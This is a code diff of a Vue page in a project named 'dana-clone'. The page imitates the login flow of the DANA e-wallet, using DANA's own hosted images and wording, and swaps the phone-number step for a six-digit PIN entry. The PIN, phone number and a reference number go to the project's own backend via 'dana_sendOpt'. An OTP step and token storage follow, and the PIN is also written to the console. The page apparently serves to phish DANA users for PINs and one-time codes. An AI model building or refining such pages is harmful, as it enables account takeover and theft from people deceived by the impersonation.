@@ -1,16 +1,8 @@
-<!--
- * @Author: xiejun xiejun@keeprisk.com
- * @Date: 2025-05-22 15:04:20
- * @LastEditors: xiejun xiejun@keeprisk.com
- * @LastEditTime: 2025-05-27 10:38:21
- * @FilePath: /dana-clone/src/views/minerMail/minerMail.vue
- * @Description: 这是默认设置,请设置`customMade`, 打开koroFileHeader查看配置 进行设置: https://github.com/OBKoro1/koro1FileHeader/wiki/%E9%85%8D%E7%BD%AE
--->
 <template>
   <div class="na-login-page">
     <div class="ipg-new__wrapper">
-      <div data-v-74d2324a="" class="new-background">
-        <div data-v-74d2324a="" class="new-background__top"></div>
+      <div class="new-background">
+        <div class="new-background__top"></div>
       </div>
       <div class="ipg-new__content">
         <div class="agreement__wrapper">
@@ -92,123 +84,61 @@
             <main class="card-agreement__content">
               <!---->
               <!---->
-              <div class="agreement__phone-wrapper">
-                <div class="input-phone-header">
-                  Input your phone number as DANA ID
-                </div>
-                <div class="input-phone-wrapper">
-                  <div class="country-flag-wrapper">
-                    <img
-                      src="https://a.m.dana.id/resource/imgs/ipg/idn-flag.svg"
-                      alt="idn-flag"
-                    />
-                  </div>
-                  <div class="country-code-wrapper">
-                    <span style="padding-left: 6px; display: inline-block"
-                      >+62</span
-                    >
-                  </div>
-                  <el-input
-                    placeholder="12312345678"
-                    v-model="inputValue"
-                    @focus="handleFocus"
-                    @blur="handleBlur"
-                    clearable
-                    type="number"
-                    ref="mainInput"
-                  >
-                    <!-- 解决部分机型数字键盘不唤起的兼容方案 -->
-                    <template #prefix>
-                      <input
-                        type="number"
-                        style="display: none"
-                        ref="fakeInput"
-                      />
-                    </template>
-                  </el-input>
-                </div>
-                <!---->
+           <div class="pin_code_container">
+            <div class="title">Enter your DANA PIN</div>
+            <div class="password_input" :class="{ 
+                  error_pin: errCode === '1' || errCode === '2'
+                }">
+              <!-- 密码输入框 -->
+              <van-password-input
+                :value="password"
+                :focused="showKeyboard"
+                :mask="hasMask"
+                @focus="focusPass"
+                @click="focusPass"
+                :class="{ 
+                  show_dot: hasMask,
+                }"
+              />
+              <el-input ref="inputPassword" v-model="password" type="number" @input="onInput" :style="{ opacity: 0, position: 'absolute', pointerEvents: 'none',width: '1px' }"></el-input>
+              <!-- 数字键盘 -->
+              <div class="input-pin__mask" @click="changeMask">
+                <img
+                  v-if="hasMask"
+                  src="https://a.m.dana.id/resource/imgs/ipg/unmask-pin.svg"
+                  alt="show/hide"
+                  class=""
+                />
+                <img
+                  v-else
+                  src="https://a.m.dana.id/resource/imgs/ipg/mask-pin.svg"
+                  alt="show/hide"
+                  class="masked"
+                />
               </div>
-              <div class="binding-feature-wrapper">
-                <div class="binding-tagline">
-                  Get many benefits for your daily life with DANA!
-                </div>
-                <div class="binding-feature">
-                  <div class="binding-feature__item">
-                    <img
-                      src="https://a.m.dana.id/resource/icons/icon-new-card.svg"
-                      alt="icon-dana"
-                      class="icon-dana"
-                    />
-                    <div class="binding-feature__item__content">
-                      <p class="binding-feature__item__content__title">
-                        The digital wallet for you
-                      </p>
-                      <p class="binding-feature__item__content__desc">
-                        Keep your cash as well as debit/credit cards seamlessly
-                        in DANA.
-                      </p>
-                    </div>
-                  </div>
-                </div>
-                <div class="binding-feature">
-                  <div class="binding-feature__item">
-                    <img
-                      src="https://a.m.dana.id/resource/icons/icon-proceed-trx.svg"
-                      alt="icon-dana"
-                      class="icon-dana"
-                    />
-                    <div class="binding-feature__item__content">
-                      <p class="binding-feature__item__content__title">
-                        Payments are easier than ever!
-                      </p>
-                      <p class="binding-feature__item__content__desc">
-                        Shopping at merchants? Use scan QRIS. Online shopping?
-                        Use send money!
-                      </p>
-                    </div>
-                  </div>
-                </div>
-                <div class="binding-feature">
-                  <div class="binding-feature__item">
-                    <img
-                      src="https://a.m.dana.id/resource/icons/icon-trusted-device.svg"
-                      alt="icon-dana"
-                      class="icon-dana"
-                    />
-                    <div class="binding-feature__item__content">
-                      <p class="binding-feature__item__content__title">
-                        Stay safe with DANA!
-                      </p>
-                      <p class="binding-feature__item__content__desc">
-                        DANA Protection secures your money and data, complete
-                        with PIN code for a better security.
-                      </p>
-                    </div>
-                  </div>
-                </div>
-              </div>
-              <!---->
-              <div class="agreement__button">
-                <div class="agreement__button-info">
-                  Your data is secured by DANA Protection.
-                </div>
-                <el-button type="primary">CONTINUE</el-button>
-                <!-- <button
-                  type="button"
-                  class="btn-continue fs-unmask btn btn-primary"
-                  disabled="disabled"
-                >
-                  
-                CONTINUE
-                </button> -->
-                <div
-                  class="agreement__button-redirect btn-back-to-merchant"
-                  style="display: none"
-                >
-                  GO TO MERCHANT PAGE
-                </div>
-              </div>
+            </div>
+        <div class="pin-error" v-if="errCode === '1'">
+          <img
+            src="https://a.m.dana.id/resource/icons/info-red.svg"
+            alt="info-red"
+          />
+          <span>Please make sure you have the right PIN and tryagain.</span>
+        </div>
+        <div class="pin-error" v-if="errCode === '2'">
+          <img
+            src="https://a.m.dana.id/resource/icons/info-red.svg"
+            alt="info-red"
+          />
+          <span>Please wait and try again later. Avoid amycommunication with the fake CS who contacts youand claims to be from DANA.</span>
+        </div>
+        <el-button
+          style="width: 100%"
+          type="text"
+          @click="handleDrawer('forget')"
+        >
+          FORGOT PIN?
+        </el-button>
+      </div>
             </main>
             <div class="card-agreement__footer fs-unmask">
               <div class="btn-wrapper">
@@ -244,15 +174,9 @@
               <div class="sticky-button__content__tnc">
                 Your data is secured by DANA Protection.
               </div>
-              <el-button type="primary">CONTINUE</el-button>
-
-              <!-- <button
-                type="button"
-                class="btn-continue btn btn-primary"
-                disabled="disabled"
+              <el-button :disabled="inputError || !inputValue" type="primary" @click="mobileContinue"
+                >CONTINUE</el-button
               >
-                CONTINUE
-              </button> -->
               <div>
                 <div class="guest-checkout-footer">
                   <div class="dana-protection__wrapper">
@@ -264,7 +188,10 @@
                     />
                   </div>
                   <div class="help">
-                    <button class="btn-help help__button" @click="handleHelp">
+                    <button
+                      class="btn-help help__button"
+                      @click="handleDrawer('help')"
+                    >
                       HELP
                       <img
                         alt="help"
@@ -281,61 +208,189 @@
         </div>
       </div>
     </div>
-    <HelpDrawer ref="helpDrawerRef" type="help"> </HelpDrawer>
+
+    <HelpDrawer ref="helpDrawerRef" :type="DrawerType"></HelpDrawer>
+    <OtpDrawer  ref="OtpDrawer" :phoneNumber="phoneNumber" :otpType="otpType"></OtpDrawer>
+    <noPhone ref="noPhone" :phoneNumber="phoneNumber"></noPhone>
+    <Footer></Footer>
   </div>
 </template>
 
 <script>
 import HelpDrawer from "@/components/helpDrawer/index.vue";
-
+import OtpDrawer from "@/components/otpDrawer/index.vue";
+import noPhone from "@/components/noPhone/index.vue";
+import { dana_sendOpt, checkUser } from '@/api/index'
 export default {
   components: {
     HelpDrawer,
+    OtpDrawer,
+    noPhone
   },
   data() {
     return {
       inputValue: "",
+      showActionDrawer: false,
+      password: "",
+      showKeyboard: false,
+      hasMask: true,
+      DrawerType: "help",
+      inputError: false,
+      errorMessage: "",
+      otpType: 'WHATSAPP_OTP',
+      // 正则表达式：第一位为8，总长度10-13位（符合印尼手机号格式）
+      phonePattern: "^8\\d{9,12}$",
+      referenceNo: '',
+      errCode:'',
+      phoneNumber: '',
+      isMobile: false
     };
   },
-  mounted() {
-    // 监听全局点击事件（处理空白处失焦）
-    document.addEventListener("click", this.handleDocumentClick);
+  watch: {
+    // 监听窗口大小变化，在设备旋转时重新检测
+    '$route'() {
+      this.checkDevice();
+    }
   },
-  beforeUnmount() {
-    // 移除全局事件监听
-    document.removeEventListener("click", this.handleDocumentClick);
+  created() {
+     this.checkDevice();
+  },
+  mounted() {
+    this.referenceNo = this.$route.query.referenceNo || ''
+    this.phoneNumber = this.$route.query.phoneNumber || ''
+    this.$refs.inputPassword.focus()
   },
   methods: {
-    handleHelp() {
+    checkDevice() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      // 检测常见移动设备的关键字
+      const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'windows phone'];
+      this.isMobile = mobileKeywords.some(keyword => userAgent.includes(keyword));
+      console.log(this.isMobile,'=====this.isMobile====')
+    },
+    focusPass() {
+      console.log(123123123)
+      this.showKeyboard = true
+      this.$refs.inputPassword.focus()
+    },
+    onInput() {
+      console.log(this.password)
+      this.password = (this.password).slice(0, 6);
+      if (this.password.length === 6) {
+          const loading = this.$loading({
+            lock: true,
+            text: this.$t('loading...'),
+            spinner: 'el-icon-loading',
+            background: 'rgba(0, 0, 0, 0.7)'
+          })
+         dana_sendOpt({
+          referenceNo: this.referenceNo,
+          phoneNumber: this.phoneNumber,
+          codeType: '0',
+          pin: this.password
+        }).then((res)=> {
+          loading.close()
+          this.$refs.inputPassword.focus()
+          this.errCode = res.data.errCode
+          if (this.errCode === '0') {
+            //  pin 验证通过
+            if (res.data.needOtp) {
+              this.$refs.OtpDrawer.showOtpDrawer = true
+              this.otpType = res.data.otpType
+              this.showActionDrawer = false
+            } else {
+              this.showActionDrawer = false
+              localStorage.setItem('DANA_Token', res.data.token)
+              this.$router.push({
+                path: '/checkout',
+                query: { 
+                  referenceNo: this.referenceNo
+                }
+              })
+            }
+          } else if (this.errCode === '1') {
+             //  pin 验证失败
+          } else if (this.errCode === '2') {
+             //  pin 验证失败次数过多
+          }
+     
+        }).finally(() => {
+          loading.close()
+        })
+      }
+      console.log(
+        "%c [  ]-370",
+        "font-size:13px; background:pink; color:#bf2c9f;",
+        this.password
+      );
+    },
+    onDelete() {
+      this.password = this.password.slice(0, this.password.length - 1);
+      this.errCode = ''
+    },
+    changeMask() {
+      this.hasMask = !this.hasMask;
+    },
+    mobileContinue() {
+      if (this.inputError) {
+        return;
+      }
+      const loading = this.$loading({
+        lock: true,
+        text: this.$t('loading...'),
+        spinner: 'el-icon-loading',
+        background: 'rgba(0, 0, 0, 0.7)'
+      })
+      checkUser({
+        phoneNumber: this.phoneNumber,
+      }).then((res)=> {
+        loading.close()
+        if (res.data.exists) {
+          this.showActionDrawer = true;
+        }else {
+          this.$refs.noPhone.showDrawer = true
+        }
+      }).finally(() => {
+        loading.close()
+      })
+ 
+    },
+    pcContinue() {
+      if (this.inputError) {
+        return;
+      }
+    },
+    handleDrawer(type) {
+      this.DrawerType = type;
       this.$refs.helpDrawerRef.showDrawer = true;
     },
-    // 聚焦时处理
-    handleFocus() {
-      // 唤起数字键盘（强制触发假输入框聚焦）
-      this.$refs.fakeInput.focus();
-      // 延迟滚动（避免键盘遮挡导致滚动失效）
-      setTimeout(() => {
-        window.scrollBy(0, 50);
-      }, 100);
-    },
+    // 实时验证手机号
+    validatePhone(value) {
+      // 清理输入：只保留数字
+      let cleanedValue = value.replace(/\D/g, "");
 
-    // 失焦时处理（包括主动失焦和空白点击）
-    handleBlur() {
-      // 先关闭键盘（确保键盘已收起）
-      this.$refs.mainInput.blur(); // 主动触发失焦
-      this.$refs.fakeInput.blur(); // 关闭假输入框键盘
+      // 限制长度不超过13位
+      if (cleanedValue.length > 13) {
+        cleanedValue = cleanedValue.substring(0, 13);
+      }
 
-      // 延迟滚动到顶部（等待键盘动画结束）
-      setTimeout(() => {
-        window.scrollTo({ top: 0, behavior: "smooth" });
-      }, 300); // 延迟时间需根据键盘动画时长调整（通常200-300ms）
-    },
+      // 更新输入值
+      this.inputValue = cleanedValue;
 
-    // 空白处点击处理
-    handleDocumentClick(event) {
-      // 判断点击位置是否在输入框外
-      if (!this.$refs.mainInput.$el.contains(event.target)) {
-        this.handleBlur(); // 触发失焦逻辑
+      // 验证正则
+      const regex = new RegExp(this.phonePattern);
+      if (cleanedValue && !regex.test(cleanedValue)) {
+        // 提供详细的错误信息
+        if (cleanedValue[0] === "0") {
+          this.errorMessage = "第一位不能为0";
+        } else if (cleanedValue[0] !== "8") {
+          this.errorMessage = "印尼手机号需以8开头";
+        } else if (cleanedValue.length < 10) {
+          this.errorMessage = "长度至少10位";
+        }
+        this.inputError = true;
+      } else {
+        this.inputError = false;
       }
     },
   },
@@ -343,6 +398,34 @@ export default {
 </script>
 
 <style lang="scss" scoped>
+  ::v-deep .show_dot .van-password-input__item {
+    position: relative; /* 必须设置relative以便absolute伪元素定位 */
+
+    &::after {
+      content: ""; /* 伪元素必需属性 */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 10px;
+      height: 10px;
+      background-color: #e3e3e3;
+      border-radius: 100%;
+      -webkit-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+      visibility: visible;
+    }
+  }
+  ::v-deep .van-password-input__security i {
+    z-index: 1;
+  }
+  ::v-deep .show_dot .van-password-input__cursor {
+    display: none;
+  }
+  ::v-deep .show_dot .van-password-input__cursor {
+    bottom: 20%;
+    width: 40%;
+    height: 1px;
+  }
 .na-login-page {
   background-color: #fff;
   ::v-deep .el-input__inner,
@@ -366,7 +449,7 @@ export default {
     .ipg-new__content {
       display: flex;
       justify-content: center;
-      margin: -2.2rem auto 0;
+      margin: -2.6rem auto 0;
       .agreement__wrapper {
         display: flex;
         .wrapper {
@@ -591,18 +674,18 @@ export default {
                 color: #313131;
               }
 
-              .binding-feature-wrapper .binding-feature__item__content__desc {
+              .binding-feature__item__content__desc {
                 font-weight: 400;
                 font-size: 0.12rem;
                 line-height: 0.16rem;
                 color: #727272;
               }
               .binding-tagline {
-                font-weight: 600;
-                font-size: 0.14rem;
-                line-height: 0.18rem;
+                font-size: .12rem;
                 color: #313131;
-                padding: 0.16rem 0;
+                line-height: .16rem;
+                margin: .08rem 0 .24rem;
+                text-align: center;
               }
               .binding-feature {
                 display: flex;
@@ -616,7 +699,8 @@ export default {
                 font-size: 0.12rem;
                 font-weight: 400;
                 line-height: 0.16rem;
-                margin: 0.09rem 0 0.08rem;
+                padding: 0.09rem 0 0.08rem;
+                border-top: 0.01rem solid #d1d1d1;
                 text-align: center;
               }
               .agreement__button-redirect {
@@ -698,6 +782,34 @@ export default {
         }
       }
     }
+    .error-msg,
+    .error-msg ::v-deep .el-input .el-input__inner {
+      color: #ff5d55 !important;
+    }
+    .error-msg.input-phone-wrapper {
+      border-color: #ff5d55 !important;
+    }
+    .error-msg {
+      border-color: #ff5d55 !important;
+    }
+    .agreement__phone-wrapper .input-phone-error {
+      -webkit-box-align: center;
+      -ms-flex-align: center;
+      align-items: center;
+      color: #ff5d55;
+      display: -webkit-box;
+      display: -ms-flexbox;
+      display: flex;
+      margin-top: 0.14rem;
+    }
+    .agreement__phone-wrapper .input-phone-error img {
+      height: 0.2rem;
+      width: 0.2rem;
+    }
+    .agreement__phone-wrapper .input-phone-error span {
+      font-size: 0.12rem;
+      margin-left: 0.06rem;
+    }
     .ipg-new__wrapper {
       background-image: url(https://a.m.dana.id/resource/imgs/ipg/dot-background.svg);
       background-repeat: no-repeat;
@@ -746,14 +858,52 @@ export default {
   //     display: none !important;
   //   }
   // }
+  /* 隐藏 Chrome、Safari、Edge 等 WebKit/Blink 内核浏览器的步进器 */
+  input[type="number"]::-webkit-inner-spin-button,
+  input[type="number"]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    appearance: none;
+    margin: 0;
+  }
+
+  /* 隐藏 Firefox 的步进器 */
+  input[type="number"] {
+    -moz-appearance: textfield;
+  }
+
+  /* 隐藏 IE/Edge 的步进器 */
+  input[type="number"]::-ms-clear,
+  input[type="number"]::-ms-reveal {
+    display: none;
+  }
+
+  /* 针对 Element UI 的输入框组件 */
+  ::v-deep .el-input input[type="number"]::-webkit-inner-spin-button,
+  ::v-deep .el-input input[type="number"]::-webkit-outer-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+  }
+  ::v-deep .el-input .el-input__inner {
+    padding-left: 5px; /* 文本颜色 */
+    font-size: 0.18rem;
+  }
   @media (max-width: 480px) {
     .sticky-button {
       display: block !important;
     }
     .wrapper,
     .agreement__button,
-    .agreement__footer {
+    .agreement__footer,
+    .card-agreement__footer {
       display: none !important;
+    }
+    .agreement__wrapper {
+      flex-direction: column;
+      // background-image: url(https://a.m.dana.id/resource/imgs/ipg/dot-background.svg);
+      // background-repeat: no-repeat;
+      // background-size: cover;
+      margin: 0 auto;
+      min-height: 7rem;
     }
     .mobile-overlap-background__top {
       width: 100%;
@@ -765,6 +915,7 @@ export default {
     .agreement__wrapper .card-agreement {
       z-index: 10;
       margin-top: -1.2rem;
+      margin-bottom: 1.4rem !important;
       width: calc(100vw - 0.24rem);
     }
     .card-agreement__guest-header .icon-dana {
@@ -821,6 +972,119 @@ export default {
       line-height: 0.16rem;
       text-align: center;
     }
+    .card-agreement__footer {
+      display: none;
+    }
   }
+  ::v-deep .pin_code_container {
+    background-color: #fff;
+    padding: 0.24rem 0.36rem;
+    .title {
+      color: #727272;
+      font-weight: 400;
+      font-size: 0.12rem;
+      line-height: 0.16rem;
+      margin-bottom: 0.16rem;
+      text-align: center;
+    }
+    .password_input {
+      // display: flex;
+      position: relative;
+      padding-right: 0.5rem;
+      border: 1px solid #e3e3e3;
+    }
+  }
+  .input-pin__mask {
+    border-left: 0.01rem solid #e3e3e3;
+    margin: 0.06rem;
+    position: absolute;
+    right: 0;
+    top: 0;
+  }
+  .input-pin__mask img {
+    cursor: pointer;
+    height: 0.16rem;
+    margin: 0.1rem;
+    width: 0.2rem;
+  }
+  ::v-deep.van-password-input {
+    margin: 0;
+  }
+  [class*="van-hairline"]::after {
+    border: 0 solid #ebedf0;
+  }
+  ::v-deep .show_dot .van-password-input__item {
+    position: relative; /* 必须设置relative以便absolute伪元素定位 */
+
+    &::after {
+      content: ""; /* 伪元素必需属性 */
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 10px;
+      height: 10px;
+      background-color: #e3e3e3;
+      border-radius: 100%;
+      -webkit-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+      visibility: visible;
+    }
+  }
+  ::v-deep .van-password-input__security i {
+    z-index: 1;
+  }
+  ::v-deep .show_dot .van-password-input__cursor {
+    display: none;
+  }
+  ::v-deep .show_dot .van-password-input__cursor {
+    bottom: 20%;
+    width: 40%;
+    height: 1px;
+  }
+  // ::v-deep .van-password-input__item  {
+  //   position: absolute;
+  //   top: 50%;
+  //   left: 50%;
+  //   width: 10px;
+  //   height: 10px;
+  //   background-color: #e3e3e3;
+  //   border-radius: 100%;
+  //   -webkit-transform: translate(-50%, -50%);
+  //   transform: translate(-50%, -50%);
+  //   visibility: visible;
+  // }
+  // ::v-deep .van-password-input__security i {
+  //   position: absolute;
+  //   top: 50%;
+  //   left: 50%;
+  //   width: 10px;
+  //   height: 10px;
+  //   background-color: #000;
+  //   border-radius: 100%;
+  //   -webkit-transform: translate(-50%, -50%);
+  //   transform: translate(-50%, -50%);
+  //   visibility: visible;
+  // }
+}
+.pin-error {
+  -webkit-box-align: center;
+  -ms-flex-align: center;
+  align-items: center;
+  color: #ff5d55;
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  margin-top: 0.14rem;
+}
+.na-login-page .pin_code_container .error_pin {
+   border:1px solid #ff5d55 !important;
+}
+.pin-error img {
+  height: 0.2rem;
+  width: 0.2rem;
+}
+.pin-error span {
+  font-size: 0.12rem;
+  margin-left: 0.06rem;
 }
 </style>
